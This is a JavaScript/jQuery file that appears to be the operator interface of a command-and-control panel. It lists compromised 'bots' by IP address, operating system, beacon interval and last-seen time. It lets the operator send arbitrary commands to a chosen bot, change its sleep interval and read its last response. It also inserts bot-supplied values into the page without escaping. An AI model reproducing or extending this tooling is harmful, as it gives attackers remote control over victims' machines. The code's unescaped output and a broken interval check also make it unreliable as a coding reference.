function csrf(){
    var csrftoken = $('meta[name=csrf-token]').attr('content');
    $.ajaxSetup({
        beforeSend: function(xhr, settings) {
            if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
                xhr.setRequestHeader("X-CSRFToken", csrftoken)
            }
        }
    });
}

function clients_list(){
    $.ajax({
        url: '/api/clients/list',
        type: 'GET',
        dataType: 'json',
        contentType: "application/json",
        success: function (data, textStatus, xhr) {
            $("#tb").html("");
            $.each(data, function(i, bot) {
                $("#tb").append('<tr id="row' + i + '"><td>' + i + "</td><td>" + bot.IP + "</td><td>" + bot.OS + "</td><td id=\"intervaltd\">" + bot.set_interval + "</td><td>" + Math.round(bot.last_seen) + "</td>");
                $("#row"+i).dblclick(function(e){
                    e.preventDefault();
                    $('.modal-title').html(bot.IP);
                    var symbol = "fa-question";
                    if (bot.OS){
                        if (bot.OS.toLowerCase().indexOf("linux") >= 0){
                            symbol = "fa-linux";
                        }
                        if (bot.OS.toLowerCase().indexOf("unix") >= 0){
                            symbol = "fa-terminal";
                        }
                        if (bot.OS.toLowerCase().indexOf("windows") >= 0){
                            symbol = "fa-windows";
                        }
                        if (bot.OS.toLowerCase().indexOf("mac") >= 0){
                            symbol = "fa-apple";
                        }
                    }
                    $('#cmdip').val(bot.IP);
                    $('#intip').val(bot.IP);
                    $('#lastResponse').html(bot.last_response);
                    $('#cliOS').html("<i class=\"fa " + symbol + "\"></i> " + bot.OS);
                    $('#modal-pop').modal('toggle');
                });
            });
        }
    });
}

function modal_tabs(e) {
    var target = $(e.target).attr("href")
    if (target == "#last-response"){
        $('#submit-btn').hide();
    }
    if (target == "#run-command"){
        $('#submit-btn').html("Run!");
        $('#submit-btn').show();
    }
    if (target == "#sleep-interval"){
        $('#submit-btn').html("Set Interval");
        $('#submit-btn').show();
    }
}

function submit_to_api(e){
    var target = $(".tab-pane.active")[0].id;
    var endp = "";
    var jdata = "";
    if (target == "run-command"){
        target = "/api/clients/cmd";
        jdata = JSON.stringify({'IP': $("#cmdip").val(), 'cmd': $('#command').val()});
    }
    if (target == "sleep-interval"){
        target = "/api/clients/sleep";
        jdata = JSON.stringify({'IP': $("#intip").val(), 'interval': $('#interval').val()});
    }
    $.ajax({
        url: target,
        type: 'POST',
        dataType: 'text',
        contentType: "application/json",
        data: jdata,
        success: function (data, textStatus, xhr) {
            $('#modal-pop').modal('toggle');
            $("#last-response").tab("show");
            $('#interval').val("");
            $('#command').val("");
            if (target == "sleep-interval"){
                $("td.intervaltd").val($('#interval').val());
            }
        }
    });
}
